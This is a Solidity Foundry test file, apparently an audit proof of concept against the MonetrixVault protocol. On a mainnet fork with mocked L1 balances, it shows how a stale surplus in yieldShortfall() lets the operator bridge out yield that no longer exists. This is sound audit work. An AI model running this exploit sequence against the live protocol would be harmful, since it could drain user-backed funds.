// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "test/ActionEncoderBoundCheck.t.sol";
import "../src/core/MonetrixVault.sol";
import "../src/interfaces/HyperCoreConstants.sol";

// ATTACK TIMELINE:
// 1. [Setup] Base harness deploys full protocol on mainnet fork
// 2. [T=0] Mock L1 precompile to show max USDC, deposit 60k USDC as user1
// 3. [T=6h] Operator bridges principal to L1 (OLP = 60k)
// 4. [T=6h] Settle daily PnL recognizing 5k profit (Accountant.surplus() = +5k)
// 5. [T=7h] L1 losses occur: mock L1 spot balance drops to exactly 5k (principal is effectively lost/locked, but 5k remains)
// 6. [T=7h] Operator calls bridgeYieldFromL1(yieldShortfall()). yieldShortfall() reads stale 5k surplus from Accountant.
// 7. [Assert] Bridge succeeds because L1 available (5k) >= bridge amount (5k), but L1 is now fully depleted below backing expectations.

contract MockCoreWriter {
    fallback() external payable {}
    receive() external payable {}
}

contract AuditAgentPoC is ToL1WeiHarness {
    function setUp() public override {
        super.setUp();
    }

    function test_exploit() public {
        // Setup mock for L1 precompile writer
        vm.etch(HyperCoreConstants.CORE_WRITER, address(new MockCoreWriter()).code);

        // Step 2: Initial state - L1 has max USDC, user deposits 60k
        _mockVaultL1SpotUsdc(type(uint64).max);
        _depositAs(user1, 60_000e6);

        // Step 3: Bridge principal to L1
        vm.warp(block.timestamp + 6 hours);
        vm.prank(operator);
        vault.keeperBridge(MonetrixVault.BridgeTarget.Vault);

        // Step 4: Settle and recognize 5k profit (stale surplus in Accountant)
        _primeDistributable(5_000e6);

        // Step 5: Simulate L1 losses. Actual L1 balance drops to 5k.
        // The Accountant still thinks there is 5k surplus on top of the 60k principal.
        // But in reality, the L1 account only has 5k total left.
        vm.warp(block.timestamp + 1 hours);
        _mockVaultL1SpotUsdc(5_000e6);

        // Step 6: Operator reads stale shortfall and bridges
        uint256 shortfall = vault.yieldShortfall();
        console.log("Step 6: yieldShortfall reads stale surplus =", shortfall);

        uint256 evmBalBefore = vault.usdc().balanceOf(address(vault));

        vm.prank(operator);
        vault.bridgeYieldFromL1(shortfall);

        uint256 evmBalAfter = vault.usdc().balanceOf(address(vault));

        // Step 7: Assert the bridge succeeded and moved funds, despite L1 being depleted below backing
        assertGt(shortfall, 0, "yieldShortfall should read stale 5,000 surplus");
        assertGt(evmBalAfter, evmBalBefore, "Bridge succeeded and moved real yield that no longer exists in L1 backing");
    }
}
